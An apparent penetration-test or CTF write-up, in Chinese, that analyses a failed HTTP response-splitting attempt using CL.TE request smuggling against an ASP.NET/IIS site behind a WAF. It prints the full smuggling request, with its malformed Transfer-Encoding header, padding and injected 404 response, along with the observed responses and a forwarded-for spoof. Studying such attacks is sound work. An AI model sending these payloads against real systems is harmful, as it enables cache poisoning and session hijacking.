# CL.TE 请求走私下的响应分割攻击失败根因分析

> **修订记录（2026-08）**：本文初版（§0x03 / §0x04）将失败归因于"前端 HTTP 状态机无法复位、需依赖嵌套解析触发器"，该结论与 RFC 7230 协议语义及实测现象矛盾，已废弃并重写为修正版。§0x01 实验记录与 §0x02 攻击构造为原始数据，完整保留；修正结论见 §0x03 / §0x04。
> 关联文档：[HTTP Response Smuggling Desync](./README.md)（§3.4 响应拆分与完全伪造的实战对照）

---

# 0x01 背景与攻击意图

在一次针对某 ASP.NET + IIS 应用的渗透测试中，观察到了典型的 CL.TE 请求走私漏洞。目标前端存在 WAF / 代理，后端为 ASP.NET，且存在一个特殊的回显端点 `HttpER.aspx`：无论向其 `LzPostExecExpression` 参数传入什么内容，响应体都会原封不动地返回该内容，并且不附加任何额外字符或 HTML 包裹。

攻击者试图利用该 CL.TE 漏洞实施 **响应分割（Response Splitting）** 攻击：将精心构造的 `HTTP/1.1 404 Not Found ...` 响应头注入到 TCP 流中，使得前端代理误将其当作下一个请求的合法响应，从而污染缓存、劫持其他用户会话或实现 XSS。然而，虽然成功实现了请求走私与响应队列错位，但预期的“伪造响应独立返回”并未发生。本文从 HTTP 协议解析本质、代理状态机机制以及与 TRACE 攻击的对比三个层面，深度剖析此次攻击失败的根源。

- 请求-1

```http
POST /login.aspx HTTP/1.1
Host: aaaa.bbbb.ctf.cc
Cache-Control: max-age=0
Origin: http://aaaa.bbbb.ctf.cc
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html
Referer: http://aaaa.bbbb.ctf.cc/index.aspx
Accept-Language: zh-CN,zh;q=0.9
Cookie: ASP.NET_SessionId=x3wjhu5mvvlkmx2xikupjkfz; loginlx=0; jscookietest=valid; uun=6bf312d0eefbc23ba2c48fd67f82848e1_1
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="142", "Google Chrome";v="142"
sec-ch-ua-mobile: ?0
Connection: keep-alive
Content-Length: 2538
Transfer-Encoding :
 chunked

0

HEAD /searchation/MkActions/ElectronDocument/MultiFileView2.html HTTP/1.1
Host: aaaa.bbbb.ctf.cc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

POST /searchation/MkActions/HttpER/HttpER.aspx HTTP/1.1
Host: aaaa.bbbb.ctf.cc
Content-Length: 1701
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Connection: keep-alive

LzPostExecExpression=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxHTTP/1.1 404 Not Found
Cache-Control: private
Content-Type: text/html; charset=gb2312
X-UA-Compatible: IE=Edge
X-XSS-Protection: 1;mode=block
Access-Control-Allow-Origin: *
Referrer-Policy: origin-when-cross-origin
X-Permitted-Cross-Domain-Policies: master-only
X-Frame-Options: ALLOWALL
Strict-Transport-Security: max-age=31536000
X-Download-Options: noopen
Access-Control-Allow-Headers: Content-Type, api_key, Authorization
Date: Thu, 14 May 2026 08:15:36 GMT
Content-Length: 3260

```

- 响应-1

```http
HTTP/1.1 404 Not Found
...
```

- 请求-2

```http
GET /Utility/Script/login.js HTTP/1.1
Host: aaaa.bbbb.ctf.cc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Referer: http://aaaa.bbbb.ctf.cc/index.aspx
Accept: */*
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

```

- 响应-2

```http
HTTP/1.1 200 OK
Content-Length: 1447
Content-Type: text/html
Last-Modified: Thu, 31 Oct 2013 03:18:03 GMT
Accept-Ranges: bytes
ETag: "9be254cfe7d5ce1:0"
Date: Thu, 14 May 2026 08:17:32 GMT

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/8.5
Set-Cookie: ASP.NET_SessionId=qikvp5b11yiihabmz04xigmj; path=/; HttpOnly
X-Powered-By: ASP.NET
Date: Thu, 14 May 2026 08:17:32 GMT
Content-Length: 1680

xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```



- 请求-3

```http
GET /Common/Dialog/WebUI/Client/Sql/sql.js HTTP/1.1
Host: aaaa.bbbb.ctf.cc
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
x-forwarded-for: 127.0.0.1
cookie: ASP.NET_SessionId=mnv3e1f2hrwov3ap4josebaa; UserAccount=8iiWpJQLZdHJ8Lk3hVnIEQ==
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="142", "Google Chrome";v="142"
sec-ch-ua-mobile: ?0
Connection: keep-alive

```

- 响应-3

```http
HTTP/1.1 200 OK
Content-Type: application/javascript
Last-Modified: Wed, 25 Sep 2013 09:25:28 GMT
Accept-Ranges: bytes
.....
```

---

# 0x02 攻击链路构造

## 2.1 利用 CL.TE 走私

请求 1 发送了一个精心构造的 `POST /login.aspx`，同时包含 `Content-Length: 2538` 和畸形的 `Transfer-Encoding : chunked`（中间有空格和换行），导致前端代理（WAF）与后端对该请求边界的解读出现分歧：

- **前端（WAF）**：根据 RFC 要求，优先信任 `Content-Length`，因此将整个请求体的 2538 字节作为当前请求的数据。
- **后端（IIS/ASP.NET）**：因 `Transfer-Encoding` 存在且格式畸变，可能忽略 `Content-Length` 并采用 `chunked` 解析，看到 `0\r\n` 即认为请求体结束。

于是，`0\r\n` 之后的数据被后端解析为两个共享该连接的新请求：

1. `HEAD /searchation/MkActions/ElectronDocument/MultiFileView2.html`
2. `POST /searchation/MkActions/HttpER/HttpER.aspx`（包含超长 padding 与注入的 404 响应头）

这构成了典型的 **请求走私**，并使得后端处理了额外的“隐式”请求。

## 2.2 精确 Padding 与 HEAD 响应的配合

攻击者注意到 `/MultiFileView2.html` 的 `Content-Length: 1447`。为了利用这个数字，他在 `HttpER.aspx` 的请求体中精心放置了大量 `x` 字符（1181 个）作为填充，使得 `HttpER.aspx` 返回的响应（包含 padding 与注入的 404 响应头）的 **前 1447 字节** 刚好是填充字符，而紧接其后的便是 `HTTP/1.1 404 Not Found ...` 完整响应头。

攻击规划如下：

- WAF 看不到后面两个走私请求，它只看到正常的 `POST /login.aspx` 及其响应（404），然后继续处理下一个正常的 `GET /Utility/Script/login.js` 请求。
- WAF 向 `/login.js` 返回的应是后者正常的 200 响应，但由于走私导致后端额外产生了 HEAD 请求的响应，该响应带有 `Content-Length: 1447` 且无 body（HEAD 方法）。
- WAF 此时认为 `/login.js` 的响应 body 长度应为 1447，于是它会从 TCP 流中继续读取恰好 1447 字节作为 body。这部分字节恰好是 `HttpER.aspx` 相应返回的 1447 字节填充，因此被顺利消费。
- 1447 字节消费完毕后，TCP 流中紧接着就是注入的 `HTTP/1.1 404 Not Found ...` 完整响应头和垫后的 `Content-Length: 3260`（故意留空指示后续有 body 但内容由攻击者控制）。攻击者预期此时 WAF 已完成 `/login.js` 响应的 body 读取，状态机应重置，并将该伪造响应作为下一个请求 `/sql.js` 的响应返回给客户端。

## 2.3 实际现象

然而，攻击者观察到的最终结果是 **响应-3 收到的却是请求-2（`/login.js`）的正常响应**，而伪造的 404 响应并未独立呈现。虽然发生了响应队列错位（表明请求走私与 HEAD 响应长度利用成功），但伪造响应却未被前端解析为独立 HTTP 消息。

---

# 0x03 失败根因（修正版）：WAF 响应侧孤儿清理阻断投递

## 3.1 初版"状态机无法复位"结论为何错误

初版将失败归因于"前端 HTTP 状态机消费完 Content-Length 后无法复位、残留字节沦为流碎片，需 `message/http` 类嵌套解析触发器才能完成响应分割"。该结论有三处硬伤，予以废弃：

- **违反 HTTP/1.1 协议语义**：RFC 7230 §3.3.3——响应体按 Content-Length / chunked 消费完毕即消息结束，keep-alive 连接上下一字节必然进入新响应解析。请求走私与响应队列投毒（response queue poisoning）的全部公开研究（如 James Kettle）都建立在这一行为之上；若代理"消费完不复位"，响应错位本身就不会发生。
- **与本次实测矛盾**：攻击者观察到 sql.js 请求收到 login.js 的真实响应（错位一级）——WAF 在消费完前一响应后**正常复位**并解析、投递了后续响应。所谓"卡死在流碎片状态"与观测不符。
- **TRACE 对比系误读**：TRACE + `message/http` 攻击的机理并非响应分割的通用前提；响应队列投毒攻击不依赖任何嵌套解析。

## 3.2 已证实的前提：对齐精确、伪造响应完整到达 WAF

修正分析前先固定两个被实验证实的事实：

1. **padding 数学闭合**：HttpER 响应头（含 `\r\n` 与结尾空行）实测 266 字节 + 1181 个 x = **1447**，与 HEAD 响应的 `Content-Length` 完全一致（差异 0 字节）。
2. **消费边界观测闭合**：响应-2 客户端收到的 body 恰好止于第 1181 个 x、不含 404 文本的任何前缀字节——WAF 精确消费了 1447 字节，注入的 `HTTP/1.1 404 Not Found...` 报文（约 499 字节）**以完整形态残留在 WAF → 后端连接缓冲中**，自状态行第一字节起。

因此"伪造响应成为孤儿"这一步是成功的。CL:3260 与 CL:0 两种变体结果完全相同，进一步说明失败与伪造报文自身内容（对齐精度、CL 自洽性）无关。

## 3.3 真正根因：WAF 为响应感知型代理，周期结束清理孤儿数据

关键旁证——**WAF 对响应做深度处理**：

- 正常请求的响应中 `Server: Microsoft-IIS/8.5`、`X-Powered-By: ASP.NET` **被 WAF 剥离**；
- 走私响应（HttpER 响应头）作为 body 透传时**保留**这两个头。

即 WAF 对每个响应执行"完整解析 → 头部改写 → 转发"，但按 CL 消费的 body 内容原样透传、不检查。在此类响应感知代理上，请求-响应按**周期**处理：

1. **请求-2（/login.js）周期**：WAF 将 HEAD 响应头解析为本请求的响应头，按 `Content-Length: 1447` 消费 body（HttpER 响应头 266 + x 1181），转发给客户端；
2. **周期结束：WAF 清理连接读缓冲中超出当前响应的数据**——残留在缓冲中的伪造 404 报文被丢弃；
3. **请求-3（/sql.js）周期**：WAF 从 IIS 后续输出开始读取，收到 login.js 的真实响应 → 响应队列错位一级；伪造响应永不出现。

该清理行为可能是有意的**响应侧反走私防护**（响应严格绑定请求周期、杜绝孤儿响应跨请求投递——即 response queue poisoning 的防御思路），也可能是实现的缓冲管理特性。无论动机如何，效果一致：**孤儿响应无法存活到下一个请求周期**。

## 3.4 与 README §3.4（响应拆分与完全伪造）的关系

README §3.4 的攻击模型（构造完整伪造报文 → 成为孤儿 → 投递给下一个受害者）隐含一个关键前提：**代理保留跨请求的孤儿响应**——这正是 response queue poisoning 类漏洞的成立条件。本次目标 WAF 实现了孤儿清理，该前提不成立：

| 环节 | 结果 | 证据 |
|------|------|------|
| CL.TE 请求走私 | ✅ 成功 | 后端处理了走私的 HEAD + HttpER 请求 |
| HEAD 响应 CL 消费 + 精确对齐 | ✅ 成功 | 266 + 1181 = 1447（数学 + 观测双重闭合） |
| 伪造响应成为孤儿 | ✅ 成功（瞬时） | 404 报文完整残留于 WAF 缓冲 |
| 孤儿跨请求投递 | ❌ 被 WAF 周期清理阻断 | sql.js 收到 login.js（错位一级），404 从不返回 |

攻击并非败于"状态机"，而是败于**目标代理是否保留孤儿响应**这一架构属性。README §3.4 的攻击适用于不清理孤儿的代理（其漏洞前提即孤儿保留），对实现了响应侧清理的 WAF 结构性不可行。

---

# 0x04 总结

**一句话结论（修正版）：**

> 攻击失败的根本原因不是"前端状态机无法复位"，而是目标 WAF 为响应感知型代理：它在每个请求-响应周期结束时清理连接缓冲中的超额数据，使以精确对齐形态形成的伪造响应孤儿在投递给下一个请求前即被丢弃。攻击可行性取决于目标代理是否保留跨请求孤儿响应（响应队列投毒的成立前提），而非注入报文的对齐精度或自洽性——CL:3260 与 CL:0 结果完全一致即为佐证。

这一案例的教训：响应分割 / 响应队列投毒类攻击在实施前，应先确认代理对"超额响应数据"的处理策略（保留 → 可投毒；周期清理 → 不可行），而非仅优化字节对齐与报文自洽性。